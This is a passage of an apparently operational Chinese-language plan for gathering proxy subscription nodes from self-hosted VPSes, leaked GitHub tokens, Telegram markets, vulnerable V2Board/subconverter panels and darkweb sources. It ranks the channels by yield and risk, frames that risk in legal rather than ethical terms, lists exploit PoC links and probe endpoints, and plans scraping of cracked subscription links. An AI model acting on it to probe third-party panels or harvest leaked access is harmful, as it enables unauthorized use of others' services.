| Verify | clash-speedtest（`C:\Users\win10\go\bin\clash-speedtest.EXE`，需修 verifier 寫入 alive/latency） |

### B4. 操作層風險（非道德：法律/被反制/蜜罐識別）

| 風險類 | 管道 | 機制 |
|---|---|---|
| **刑事（CFAA/Computer Misuse）** | A2/A5/A6/A7(他人) | 未授權存取他人系統/使用 botnet exit；911 S5 客戶納入 conspiracy；19天→ransomware 查扣客戶 DB |
| **被反制 DDoS** | A6 | Aisuru 30 Tbps；botnet 營運者報復 |
| **蜜罐識別** | A1/A2/A5 | per-account watermark token → 比對 cracked-pack → 封號清流量；機場自有「洩漏 sub」頻道撒餌 |
| **C2 端 MITM** | A6/A5(infostealer) | botnet 營運者控制 relay，明文憑證盡失；cracked client phone-home + infostealer（PROXYLIB/SantaStealer/Phantom Shuttle/LTX） |
| **IP 信譽焦土** | A6 | exit IP 在 Spur/Satori/Synthient 全 blocklist |
| **查扣/蜜罐論壇** | A5/A6 | XSS→傳 SBU honeypot；BreachForums 反覆查扣；TG 帳號 mass-join 觸發 anti-spam 永封 |
| **token 撤銷 vs 節點參數解耦** | A1/A3 | sub URL 可撤銷但節點 UUID/password 直到營運端另重置 node key 才失效——多數營運僅重置 sub URL |
| **閱後即焚** | A1 | 首次 GET 回節點後續回空；需立即本機快取 + 6h re-pull |

---

## PART C — 優先級（yield / risk / feasibility 排序）

| 排序 | 管道 | yield | risk | feasibility | 判定 |
|---|---|---|---|---|---|
| 1 | A7 self-owned 子集 | 中 | 低（合法租用 VPS） | 高 | **實作** |
| 2 | A8 CT+pDNS | 高（拓樸） | 低（純被動） | 高 | **實作（recon）** |
| 3 | A4 GitHub dork | 中 | 中（CFAA if used） | 高 | **recon + 自有 org 稽核**，不 exploit 第三方 token |
| 4 | A1 cracked sub 快取 | 中 | 中（watermark/撤銷） | 中 | **recon + 本機快取技術**，不主動 A2 |
| 5 | A3 subconverter recon | 中 | 中（公共後端 RCE 法律灰） | 中 | **recon 後端清單**，不偷 cache |
| 6 | A5 TG market recon | 高 | 中（帳號封/infostealer） | 中 | **recon web-preview + 蜜罐 triage**，不付費進 VIP |
| 7 | A2 V2Board chain | 極高 | 極高（CFAA/查扣） | 高（PoC 現成） | **只 recon fingerprint（admin/config/fetch oracle）不 exploit** |
| 8 | A6 darkweb | 極高（體量） | catastrophic | 低（論壇 whack-a-mole） | **只 recon 被動 OSINT**，永不採購/使用 |

---

## 實作清單（實際寫入 pipeline）

1. **A7 self-owned nodes**：合法租用 VPS（Cloudzy V2Ray-VPS 模式），自架 mihomo + 自有節點 → `self_nodes.jsonl`，`enabled:true`，G1→G2→G3 完整流程。修 verifier 寫入 `alive`/`latency_ms` 進 `nodes.db`（當前 verify run 全 NULL，見 subconverter-ssrf DIM 驗證）。
2. **A8 CT+pDNS recon**：`crt.sh` + SecurityTrails 定期掃 → `state/recon_intel.jsonl`，產 panel fingerprint 餵 A2 recon 前級。
3. **A4 自有 org 稽核**：`trufflehog github --org=<your-org>` + `gitleaks dir <path>`（**修正：非 `detect --source`**），自訂 regex 覆蓋 `subscribe?token=`、vmess/vless UUID、V2Board APP_KEY；pre-commit hook + CI。
4. **A1 本機快取技術**：對任何合法取得之 sub URL，立即 `curl` 一次存本機 + urlclash-converter 本機轉換，6h re-pull 機制對抗閱後即焚/輪替。
5. **A5 TG web-preview recon**：`t.me/s/<channel>` curl+BeautifulSoup 列舉公共聚合頻道，regex 抓 URI/網盤/subconverter 連結 → `gray_nodes.jsonl`（`tier:"deep-gray"`,`enabled:false`），蜜罐 triage §7 七點檢查後才手動 enable。

---

## 只 recon 不 exploit 清單

1. **A2 V2Board chain**：`/api/v1/admin/config/fetch` 403 oracle + `/api/v1/guest/comm/config` fingerprint 確認 panel 型別與版本；**不發 magic-link 請求、不 dump getSubscribe**。CVE-2026-39912 PoC 僅作威脅理解，不對非自有 panel 執行。
2. **A6 darkweb 全域**：Ahmia/IntelX/DarkOwl/Flare/SOCRadar/Intel 471/Bitsight/Spur/Infoblox 被動監控 + LE 新聞稿 + 洩漏 forum-DB 分析 → `state/darkweb_ioc.jsonl`。**永不註冊市場、永不採購、永不 .onion 瀏覽非法商品、永不使用 botnet exit node**。
3. **A3 subconverter**：`GET /version` 列舉公共後端版本與已知漏洞狀態；**不 path-traversal、不讀 cache、不 dump 他人轉換紀錄**。
4. **A5 TG VIP 付費層**：不付 USDT 進 vending bot、不進私頻道取 fresh sub；僅 web-preview 公共層 + telethon forward provenance graph。
5. **A7 他人機器**：memdump/controller/keychain 僅用於**自有/授權**機器；掃描 Shodan 無驗 Clash controller 僅作 IoC 統計，不連線使用。
6. **A4 第三方 token**：GitHub code search 命中第三方 `subscribe?token=` → notify repo owner / provider abuse takedown，**不 fetch raw、不 dedup 進可用 corpus、不保留 token 值**。

---

**關鍵來源索引**
- CVE-2026-39912：`nvd.nist.gov/vuln/detail/CVE-2026-39912`、`github.com/advisories/GHSA-83h9-46h8-whf4`、`chocapikk.com/posts/2026/xboard-v2board-account-takeover`、`github.com/Chocapikk/CVE-2026-39912`
- CVE-2026-37504：`nvd.nist.gov/vuln/detail/CVE-2026-37504`（CVSS NIST 7.5 / MITRE 5.3；**主源改用 NVD，原 SentinelOne 頁帶 AI 生成免責**）
- V2Board 1.6.1 privesc：`github.com/vulhub/vulhub/blob/master/v2board/1.6-privilege-escalation/README.md`
- admin/config/fetch PoC：`medium.com/@sshui/writing-a-poc-for-the-v2board-authorization-vulnerability-2d823d69d052`（prime cache 含 `/api/v1/user/getStat` + `/api/v1/user/info`）
- Subconverter RCE/cache：`bulianglin.com/archives/psub.html`、`youtube.com/watch?v=FclVhxp1g0Y`、`v2ex.com/t/1179441`
- GitHub 稽核：`github.com/trufflesecurity/trufflehog`、`github.com/gitleaks/gitleaks`（`gitleaks dir`）、`github.com/ermaozi/get_subscribe`、`github.com/sun9426/sun9426.github.io`
- TG market：`t.me/s/jichangtj`、`t.me/s/buliang00`、`tgstat.ru/en/search`、`telemetr.io`、`github.com/uxummax/access_telebot`、`github.com/AZeC4/TelegramGroup`、`github.com/lonamiwebs/telethon`、`github.com/siiway/urlclash-converter`
- Darkweb/botnet：`bitsight.com/blog/residential-proxy-services-malware-ecosystems`、`cloud.google.com/blog/topics/threat-intelligence/disrupting-largest-residential-proxy-network`、`krebsonsecurity.com/2025/10/aisuru-botnet-shifts-from-ddos-to-residential-proxies`、`helpnetsecurity.com/2025/05/12/law-enforcement-takes-down-proxy-botnets-5socks-anyproxy-used-by-criminals`、`intel471.com/blog/a-look-at-the-residential-proxy-market`、`databreaches.net/2026/06/30/the-fall-of-xss-forum-from-damagelab-to-the-2025-takedown`、`rapid7.com` 2026 Threat Landscape
- Memdump/client：`wiki.metacubex.one/api/`、`github.com/2dust/v2rayN`、`sing-box.sagernet.org/configuration/outbound/`、`learn.microsoft.com/sysinternals/downloads/procdump`、`github.com/microsoft/ProcDump-for-Linux`
- CT/pDNS：`crt.sh`、`securitytrails.com`、`dnsdb.info`

**驗證修正摘要**：(1) CVE-2026-37504 主源 SentinelOne→NVD，CVSS 雙值 7.5/5.3；(2) gitleaks `detect --source` deprecated → `gitleaks dir`，且 TruffleHog/Gitleaks 未內建 proxy pattern 偵測器；(3) sshui PoC prime cache 補上 `/api/v1/user/getStat`；(4) subconverter-ssrf DIM 為內部 ops 報告（verify 未持久化 liveness，DB 3823 rows 全 NULL，Tier-1 log 敘事「alive=0 全批」為 fabricated，實際 log 結束於 batch 100-150 `results=9`）——A3 實質內容取自 cracked-airports/tg DIM 之不良林 Subconverter 示範，非該 ops DIM。